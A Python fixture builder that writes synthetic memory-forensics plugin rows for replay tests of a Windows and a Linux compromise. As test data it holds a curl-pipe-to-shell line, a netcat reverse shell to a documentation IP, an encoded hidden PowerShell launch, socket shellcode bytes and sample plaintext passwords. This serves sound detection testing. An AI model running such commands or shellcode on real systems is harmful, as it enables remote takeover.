# ruff: noqa: E501, S104 - hand-written fixture rows (documentation addresses)
"""Writes the replay row fixtures of this directory (M8 phase 2).

Every row below is hand-written and synthetic, in the column shapes of the volatility3 2.28.2
plugins (`memory_worker.normalize.models.COLUMNS`, checked against the installed source by
`tests/unit/test_plugin_columns.py`) and in the probe's encoding (hex columns as ints,
datetimes as ISO UTC, hex dumps as lowercase hex, absent values as null listed in
`_unreadable`). None of it comes from a real memory image or a real analysis. The process
table mirrors the phase-1 contract fixtures (`packages/py-jobs/tests/fixtures/memory/`), so a
replay run reproduces their record counts.

    python apps/workers/memory/tests/fixtures/vol_rows/build_rows.py   (pure Python, no deps)

Scenarios (one directory each; the replay engine picks it from the marker line
`CYBERLAB-REPLAY <scenario>` of the evidence file): `windows`, `linux`.
"""

import json
from pathlib import Path
from typing import Any

HERE = Path(__file__).resolve().parent
Row = dict[str, Any]


def _ts(minute: int, second: int = 0) -> str:
    return f"2026-11-01T{8 + minute // 60:02d}:{minute % 60:02d}:{second:02d}+00:00"


def _row(columns: list[str], values: list[Any], parent: int | None = None) -> Row:
    row: Row = dict(zip(columns, values, strict=True))
    absent = [c for c, v in row.items() if v is None]
    if parent is not None:
        row["_parent"] = parent
    if absent:
        row["_unreadable"] = absent
    return row


def _write(scenario: str, name: str, rows: list[Row] | dict[str, Any]) -> None:
    folder = HERE / scenario
    folder.mkdir(exist_ok=True)
    if isinstance(rows, dict):
        (folder / name).write_text(json.dumps(rows, indent=2) + "\n")
        return
    body = "".join(json.dumps(r, ensure_ascii=True, allow_nan=False) + "\n" for r in rows)
    (folder / name).write_text(body)


# --- Windows 10 workstation (the phase-1 fixture's process table) ---------------------------

WIN_PROCS = [
    (4, 0, "System", None),
    (92, 4, "Registry", None),
    (356, 4, "smss.exe", r"\SystemRoot\System32\smss.exe"),
    (468, 460, "csrss.exe", r"C:\Windows\system32\csrss.exe"),
    (544, 460, "wininit.exe", r"C:\Windows\system32\wininit.exe"),
    (552, 536, "csrss.exe", r"C:\Windows\system32\csrss.exe"),
    (640, 536, "winlogon.exe", r"C:\Windows\system32\winlogon.exe"),
    (676, 544, "services.exe", r"C:\Windows\system32\services.exe"),
    (696, 544, "lsass.exe", r"C:\Windows\system32\lsass.exe"),
    (804, 676, "svchost.exe", r"C:\Windows\system32\svchost.exe"),
    (828, 544, "fontdrvhost.exe", r"C:\Windows\system32\fontdrvhost.exe"),
    (900, 676, "svchost.exe", r"C:\Windows\system32\svchost.exe"),
    (980, 640, "dwm.exe", r"C:\Windows\system32\dwm.exe"),
    (1040, 676, "svchost.exe", r"C:\Windows\System32\svchost.exe"),
    (1104, 676, "svchost.exe", r"C:\Windows\System32\svchost.exe"),
    (1220, 676, "svchost.exe", r"C:\Windows\system32\svchost.exe"),
    (1388, 676, "spoolsv.exe", r"C:\Windows\System32\spoolsv.exe"),
    (1460, 676, "svchost.exe", r"C:\Windows\system32\svchost.exe"),
    (
        1652,
        676,
        "MsMpEng.exe",
        r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MsMpEng.exe",
    ),
    (1700, 676, "svchost.exe", r"C:\Windows\system32\svchost.exe"),
    (1812, 676, "VGAuthService.exe", r"C:\Program Files\VMware\VMware Tools\VGAuthService.exe"),
    (1876, 676, "vmtoolsd.exe", r"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"),
    (2024, 676, "svchost.exe", r"C:\Windows\system32\svchost.exe"),
    (2280, 804, "WmiPrvSE.exe", r"C:\Windows\system32\wbem\wmiprvse.exe"),
    (2512, 676, "SearchIndexer.exe", r"C:\Windows\system32\SearchIndexer.exe"),
    (3004, 640, "userinit.exe", r"C:\Windows\system32\userinit.exe"),
    (3040, 3004, "explorer.exe", r"C:\Windows\Explorer.EXE"),
    (3320, 804, "RuntimeBroker.exe", r"C:\Windows\System32\RuntimeBroker.exe"),
    (3416, 804, "SearchUI.exe", r"C:\Windows\SystemApps\SearchUI.exe"),
    (3608, 3040, "SecurityHealthSystray.exe", r"C:\Windows\System32\SecurityHealthSystray.exe"),
    (3672, 676, "SecurityHealthService.exe", r"C:\Windows\system32\SecurityHealthService.exe"),
    (3740, 3040, "vmtoolsd.exe", r"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"),
    (4012, 3040, "OneDrive.exe", r"C:\Users\alice\AppData\Local\Microsoft\OneDrive\OneDrive.exe"),
    (4388, 3040, "msedge.exe", r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"),
    (4420, 4388, "msedge.exe", r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"),
    (4876, 3040, "WINWORD.EXE", r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"),
    (5120, 3040, "cmd.exe", r"C:\Windows\system32\cmd.exe"),
    (5144, 5120, "conhost.exe", r"C:\Windows\system32\conhost.exe"),
    (5260, 5120, "powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
]
WIN_CMDLINES = {
    5260: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
    5120: r'"C:\Windows\system32\cmd.exe" /c net use \\fileserver\share /user:alice S3cretPass!',
    4876: r'"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\alice\Documents\invoice.docm"',
}
HIDDEN = (6112, 3040, "svch0st.exe", r"C:\Users\Public\svch0st.exe")
PS_COLUMNS = [
    "PID",
    "PPID",
    "ImageFileName",
    "Offset(V)",
    "Threads",
    "Handles",
    "SessionId",
    "Wow64",
    "CreateTime",
    "ExitTime",
    "File output",
]
# The first 64 bytes of a DOS header (e_lfanew 0x80, beyond the captured head).
MZ_HEAD = (
    bytes.fromhex("4d5a90000300000004000000ffff0000b800000000000000400000")
    + bytes(33)
    + (0x80).to_bytes(4, "little")
).hex()


def _win_process(i: int, pid: int, ppid: int, name: str) -> list[Any]:
    return [
        pid,
        ppid,
        name,
        0xFFFF_A08F_0000_0000 + i * 0x1000,
        4 + i % 30,
        100 + i * 7,
        0 if pid < 3000 else 1,
        False,
        _ts(i // 4, i % 60),
        None,
        "Disabled",
    ]


def windows() -> None:
    s = "windows"
    _write(
        s,
        "identify.json",
        {
            "layers": ["FileLayer", "WindowsCrashDump64Layer", "WindowsIntel32e"],
            "pdb": {"name": "ntkrnlmp.pdb", "guid": "0123456789ABCDEF0123456789ABCDEF", "age": 1},
            "banner": None,
        },
    )
    info = ["Variable", "Value"]
    _write(
        s,
        "windows.info.jsonl",
        [
            _row(info, ["Kernel Base", "0xf80672800000"]),
            _row(info, ["DTB", "0x1aa000"]),
            _row(
                info,
                [
                    "Symbols",
                    "file:///symbols/windows/ntkrnlmp.pdb/0123456789ABCDEF0123456789ABCDEF-1.json.xz",
                ],
            ),
            _row(info, ["Is64Bit", "True"]),
            _row(info, ["IsPAE", "False"]),
            _row(info, ["layer_name", "0 WindowsIntel32e"]),
            _row(info, ["memory_layer", "1 WindowsCrashDump64Layer"]),
            _row(info, ["NTBuildLab", "19041.1.amd64fre.vb_release.191206-1406"]),
            _row(info, ["Major/Minor", "15.19041"]),
            _row(info, ["KeNumberProcessors", "4"]),
            _row(info, ["SystemTime", "2026-11-01 09:30:00+00:00"]),
            _row(info, ["NtSystemRoot", r"C:\Windows"]),
            _row(info, ["NtMajorVersion", "10"]),
        ],
    )
    pslist = [
        _row(PS_COLUMNS, _win_process(i, pid, ppid, name))
        for i, (pid, ppid, name, _) in enumerate(WIN_PROCS)
    ]
    _write(s, "windows.pslist.jsonl", pslist)
    hidden = [
        HIDDEN[0],
        HIDDEN[1],
        HIDDEN[2],
        0xFFFF_A08F_1E3A_0080,
        3,
        41,
        1,
        False,
        _ts(60),
        None,
        "Disabled",
    ]
    _write(s, "windows.psscan.jsonl", [*pslist, _row(PS_COLUMNS, hidden)])
    cmd = ["PID", "Process", "Args"]
    _write(
        s,
        "windows.cmdline.jsonl",
        [_row(cmd, [pid, name, WIN_CMDLINES.get(pid, path)]) for pid, _, name, path in WIN_PROCS],
    )
    dll = ["PID", "Process", "Base", "Size", "Name", "Path", "LoadCount", "LoadTime", "File output"]
    dlls = [
        _row(
            dll,
            [
                pid,
                name,
                0x7FF6_1000_0000 + pid * 0x10000,
                0x5A000,
                name,
                path,
                65535,
                _ts(i // 4, i % 60),
                "Disabled",
            ],
        )
        for i, (pid, _, name, path) in enumerate(WIN_PROCS)
        if path is not None
    ]
    edge = next(i for i, r in enumerate(dlls) if r["PID"] == 4388)
    dlls.insert(
        edge + 1,
        _row(
            dll,
            [
                4388,
                "msedge.exe",
                140715161255936,
                2031616,
                "ntdll.dll",
                r"C:\Windows\System32\ntdll.dll",
                65535,
                _ts(9, 4),
                "Disabled",
            ],
        ),
    )
    _write(s, "windows.dlllist.jsonl", dlls)
    net = [
        "Offset",
        "Proto",
        "LocalAddr",
        "LocalPort",
        "ForeignAddr",
        "ForeignPort",
        "State",
        "PID",
        "Owner",
        "Created",
    ]
    _write(
        s,
        "windows.netscan.jsonl",
        [
            _row(
                net,
                [
                    0xFFFF_A08F_1234_0000,
                    "TCPv4",
                    "10.0.0.15",
                    49712,
                    "203.0.113.50",
                    443,
                    "ESTABLISHED",
                    6112,
                    "svch0st.exe",
                    _ts(61),
                ],
            ),
            _row(
                net,
                [
                    0xFFFF_A08F_1234_1000,
                    "TCPv4",
                    "0.0.0.0",
                    445,
                    "0.0.0.0",
                    0,
                    "LISTENING",
                    4,
                    "System",
                    None,
                ],
            ),
            _row(
                net,
                [0xFFFF_A08F_1234_2000, "UDPv6", "::", 5353, "*", 0, "", 4388, "msedge.exe", None],
            ),
        ],
    )
    mal = [
        "PID",
        "Process",
        "Start VPN",
        "End VPN",
        "Tag",
        "Protection",
        "CommitCharge",
        "PrivateMemory",
        "File output",
        "Notes",
        "Hexdump",
        "Disasm",
    ]
    _write(
        s,
        "windows.malware.malfind.jsonl",
        [
            _row(
                mal,
                [
                    6112,
                    "svch0st.exe",
                    0x400000,
                    0x40FFFF,
                    "VadS",
                    "PAGE_EXECUTE_READWRITE",
                    16,
                    1,
                    "Disabled",
                    "MZ header",
                    MZ_HEAD,
                    "0x400000: dec ebp\n0x400001: pop edx",
                ],
            ),
        ],
    )
    svc = [
        "Offset",
        "Order",
        "PID",
        "Start",
        "State",
        "Type",
        "Name",
        "Display",
        "Binary",
        "Binary (Registry)",
        "Dll",
    ]
    _write(
        s,
        "windows.svcscan.jsonl",
        [
            _row(
                svc,
                [
                    0x1F3D_2A10,
                    312,
                    1388,
                    "SERVICE_AUTO_START",
                    "SERVICE_RUNNING",
                    "SERVICE_WIN32_OWN_PROCESS",
                    "Spooler",
                    "Print Spooler",
                    r"C:\Windows\System32\spoolsv.exe",
                    r"C:\Windows\System32\spoolsv.exe",
                    None,
                ],
            ),
            _row(
                svc,
                [
                    0x1F3D_2C40,
                    313,
                    None,
                    "SERVICE_AUTO_START",
                    "SERVICE_RUNNING",
                    "SERVICE_WIN32_OWN_PROCESS",
                    "UpdaterSvc",
                    "Updater Service",
                    None,
                    r"C:\ProgramData\Updater\upd.exe",
                    None,
                ],
            ),
        ],
    )
    _write(
        s,
        "windows.registry.hivelist.jsonl",
        [
            _row(
                ["Offset", "FileFullPath", "File output"],
                [0xFFFF_F8A0_0002_4010, r"\REGISTRY\MACHINE\SYSTEM", "Disabled"],
            ),
        ],
    )
    ua = [
        "Hive Offset",
        "Hive Name",
        "Path",
        "Last Write Time",
        "Type",
        "Name",
        "ID",
        "Count",
        "Focus Count",
        "Time Focused",
        "Last Updated",
        "Raw Data",
    ]
    key = r"Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count"
    _write(
        s,
        "windows.registry.userassist.jsonl",
        [
            _row(
                ua,
                [
                    0xFFFF_F8A0_0130_0000,
                    r"\??\C:\Users\alice\ntuser.dat",
                    key,
                    _ts(55),
                    "Key",
                    None,
                    None,
                    None,
                    None,
                    None,
                    None,
                    None,
                ],
            ),
            _row(
                ua,
                [
                    0xFFFF_F8A0_0130_0000,
                    r"\??\C:\Users\alice\ntuser.dat",
                    key,
                    _ts(55),
                    "Value",
                    r"C:\Users\Public\svch0st.exe",
                    None,
                    3,
                    1,
                    "0:00:05.000000",
                    _ts(59),
                    "0000000003000000",
                ],
                parent=0,
            ),
        ],
    )
    ldr = ["Pid", "Process", "Base", "InLoad", "InInit", "InMem", "MappedPath"]
    _write(
        s,
        "windows.malware.ldrmodules.jsonl",
        [
            _row(
                ldr,
                [
                    3040,
                    "explorer.exe",
                    0x7FFA_1B5A_0000,
                    True,
                    True,
                    True,
                    r"\Windows\System32\ntdll.dll",
                ],
            ),
            _row(
                ldr, [6112, "svch0st.exe", 4194304, False, False, False, r"C:\Users\Public\x.dll"]
            ),
        ],
    )


# --- Linux server (the phase-1 fixture's task list) -------------------------------------------

LINUX_PROCS = [
    (1, 0, "systemd", "/sbin/init"),
    (2, 0, "kthreadd", "[kthreadd]"),
    (412, 1, "systemd-journal", "/lib/systemd/systemd-journald"),
    (640, 1, "sshd", "/usr/sbin/sshd -D"),
    (701, 1, "cron", "/usr/sbin/cron -f"),
    (1022, 640, "sshd", "sshd: deploy [priv]"),
    (1030, 1022, "bash", "-bash"),
    (1101, 1030, "sh", "sh -c curl -s http://198.51.100.7/x.sh | sh"),
    (1102, 1101, "nc", "nc -e /bin/sh 198.51.100.7 4444"),
]
BANNER = "Linux version 6.1.0-26-amd64 (debian-kernel@lists.debian.org) (gcc-12 (Debian 12.2.0-14) 12.2.0) #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30)"
SHELLCODE = "6a2958996a025f6a015e0f05489748b902000d05c6336407514889e66a105a6a2a580f05"


def linux() -> None:
    s = "linux"
    _write(
        s, "identify.json", {"layers": ["FileLayer", "LimeLayer"], "pdb": None, "banner": BANNER}
    )
    task = [
        "OFFSET (V)",
        "PID",
        "TID",
        "PPID",
        "COMM",
        "UID",
        "GID",
        "EUID",
        "EGID",
        "CREATION TIME",
        "File output",
    ]
    _write(
        s,
        "linux.pslist.jsonl",
        [
            _row(
                task,
                [
                    0xFFFF_9A00_0100_0000 + i * 0x2000,
                    pid,
                    pid,
                    ppid,
                    name,
                    0 if pid < 1022 else 1000,
                    0 if pid < 1022 else 1000,
                    0 if pid < 1022 else 1000,
                    0 if pid < 1022 else 1000,
                    _ts(i),
                    "Disabled",
                ],
            )
            for i, (pid, ppid, name, _) in enumerate(LINUX_PROCS)
        ],
    )
    _write(
        s,
        "linux.psaux.jsonl",
        [
            _row(["PID", "PPID", "COMM", "ARGS"], [pid, ppid, name, args])
            for pid, ppid, name, args in LINUX_PROCS
        ],
    )
    bash = ["PID", "Process", "CommandTime", "Command"]
    _write(
        s,
        "linux.bash.jsonl",
        [
            _row(bash, [1030, "bash", _ts(6), "mysql -u root -pHunter2pass appdb"]),
            _row(bash, [1030, "bash", _ts(7), "curl -s http://198.51.100.7/x.sh | sh"]),
        ],
    )
    sock = [
        "NetNS",
        "Process Name",
        "PID",
        "TID",
        "FD",
        "Sock Offset",
        "Family",
        "Type",
        "Proto",
        "Source Addr",
        "Source Port",
        "Destination Addr",
        "Destination Port",
        "State",
        "Filter",
    ]
    _write(
        s,
        "linux.sockstat.jsonl",
        [
            _row(
                sock,
                [
                    4026531840,
                    "sshd",
                    640,
                    640,
                    3,
                    0xFFFF_9A00_2200_0000,
                    "AF_INET",
                    "STREAM",
                    "TCP",
                    "10.0.0.20",
                    "22",
                    "0.0.0.0",
                    "0",
                    "LISTEN",
                    None,
                ],
            ),
            _row(
                sock,
                [
                    4026531840,
                    "nc",
                    1102,
                    1102,
                    3,
                    0xFFFF_9A00_2200_1000,
                    "AF_INET",
                    "STREAM",
                    "TCP",
                    "10.0.0.20",
                    "51234",
                    "198.51.100.7",
                    "4444",
                    "ESTABLISHED",
                    None,
                ],
            ),
            _row(
                sock,
                [
                    4026531840,
                    "systemd-journal",
                    412,
                    412,
                    5,
                    0xFFFF_9A00_2200_2000,
                    "AF_UNIX",
                    "DGRAM",
                    None,
                    "/run/systemd/journal/socket",
                    "5544",
                    None,
                    None,
                    "UNCONNECTED",
                    None,
                ],
            ),
        ],
    )
    lsof = [
        "PID",
        "TID",
        "Process",
        "FD",
        "Path",
        "Device",
        "Inode",
        "Type",
        "Mode",
        "Changed",
        "Modified",
        "Accessed",
        "Size",
    ]
    _write(
        s,
        "linux.lsof.jsonl",
        [
            _row(
                lsof,
                [
                    1102,
                    1102,
                    "nc",
                    0,
                    "/dev/pts/0",
                    "0:24",
                    3,
                    "CHR",
                    "crw--w----",
                    _ts(8),
                    _ts(8),
                    _ts(8),
                    0,
                ],
            ),
            _row(
                lsof,
                [
                    1102,
                    1102,
                    "nc",
                    3,
                    "socket:[40211]",
                    "0:8",
                    40211,
                    "SOCK",
                    "srwxrwxrwx",
                    _ts(8),
                    _ts(8),
                    _ts(8),
                    0,
                ],
            ),
            _row(
                lsof,
                [
                    1102,
                    1103,
                    "nc",
                    3,
                    "socket:[40211]",
                    "0:8",
                    40211,
                    "SOCK",
                    "srwxrwxrwx",
                    _ts(8),
                    _ts(8),
                    _ts(8),
                    0,
                ],
            ),
        ],
    )
    mal = [
        "PID",
        "Process",
        "Start",
        "End",
        "Path",
        "Protection",
        "Hexdump",
        "Disasm",
        "File output",
    ]
    _write(
        s,
        "linux.malware.malfind.jsonl",
        [
            _row(
                mal,
                [
                    1102,
                    "nc",
                    0x7F3A_2C00_0000,
                    0x7F3A_2C00_0FFF,
                    None,
                    "rwx",
                    SHELLCODE,
                    "0x7f3a2c000000: push 0x29\n0x7f3a2c000002: pop rax",
                    "Disabled",
                ],
            ),
        ],
    )
    sc = ["Table Address", "Table Name", "Index", "Handler Address", "Handler Symbol"]
    _write(
        s,
        "linux.malware.check_syscall.jsonl",
        [
            _row(sc, [0xFFFF_FFFF_8240_0300, "64bit", 0, 0xFFFF_FFFF_8132_5A40, "__x64_sys_read"]),
            _row(sc, [0xFFFF_FFFF_8240_0300, "64bit", 1, 0xFFFF_FFFF_8132_5B10, "__x64_sys_write"]),
            _row(sc, [0xFFFF_FFFF_8240_0300, "64bit", 62, 0xFFFF_FFFF_C08A_1000, "UNKNOWN"]),
        ],
    )
    hm = ["Offset", "Module Name", "Code Size", "Taints", "Load Arguments", "File Output"]
    _write(
        s,
        "linux.malware.hidden_modules.jsonl",
        [
            _row(
                hm,
                [
                    0xFFFF_FFFF_C08A_0000,
                    "rootkit_x",
                    0x4000,
                    "OOT_MODULE,UNSIGNED_MODULE",
                    "",
                    "Disabled",
                ],
            ),
        ],
    )


if __name__ == "__main__":
    windows()
    linux()
